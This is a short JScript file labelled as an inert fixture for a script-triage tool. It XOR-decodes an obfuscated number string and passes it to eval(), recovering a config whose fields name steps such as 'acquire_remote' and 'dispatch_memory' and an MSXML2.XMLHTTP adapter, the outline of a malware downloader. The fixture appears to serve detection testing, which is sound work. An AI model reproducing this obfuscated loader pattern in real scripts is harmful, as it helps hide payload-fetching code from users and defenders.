// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_d3eef8b8(v_a19c) {
  var keyBytes = [151,96,248,18,20];
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ keyBytes[i % keyBytes.length]); }
  return v_b27e;
}
function recover_f2fbe6eb() {
  if (true) {
    var packedText = "236-66-139-102-113-231-19-218-40-79-181-1-155-99-97-254-18-157-77-102-242-13-151-102-113-181-76-218-118-125-228-16-153-102-119-255-63-149-119-121-248-18-129-48-73-187-66-153-118-117-231-20-157-96-54-173-66-181-65-76-218-44-202-60-76-218-44-176-70-64-199-78-206-60-36-181-76-218-100-117-251-21-157-97-54-173-27-218-113-117-250-16-153-123-115-249-63-145-118-54-173-66-155-115-121-231-1-145-117-122-186-87-157-118-117-165-88-156-36-113-246-66-212-48-97-229-12-218-40-54-255-20-140-98-103-173-79-215-37-113-243-1-202-42-112-161-5-153-60-113-239-1-149-98-120-242-78-145-124-98-246-12-145-118-59-167-86-157-43-32-242-2-158-60-112-246-20-218-62-54-226-19-157-96-75-246-7-157-124-96-181-90-218-90-97-249-20-138-119-103-228-44-153-112-59-160-5-156-115-38-175-4-206-119-117-181-29-212-48-103-227-1-159-119-87-248-21-150-102-54-173-82-133";
    var packedParts = packedText.split("-");
    var v_a19c = [];
    for (var di = 0; di < packedParts.length; di++) { v_a19c.push(parseInt(packedParts[di], 10)); }
    var v_f602 = "PROCESSOR_ARCHITECTURE";
    var v_b27e = [];
    var pass = 0;
    while (pass < 1) { v_b27e = decode_d3eef8b8.call(null, v_a19c); pass++; }
    var v_c304 = "", bi = 0;
    for (bi = 0; bi < v_b27e.length; bi++) { v_c304 += String.fromCharCode(v_b27e[bi]); }
    return v_c304;
  }
}
function inspect_0e6a0d2c() {
  var v_d41a = eval("(" + recover_f2fbe6eb.call(null) + ")");
  var table = { steps: function() { return v_d41a["steps"]; }, values: function() { return v_d41a["values"]; } };
  return { steps: table["steps"].call(null), adapter: v_d41a["adapter"], values: table["values"].call(null), stageCount: v_d41a["stageCount"] };
}
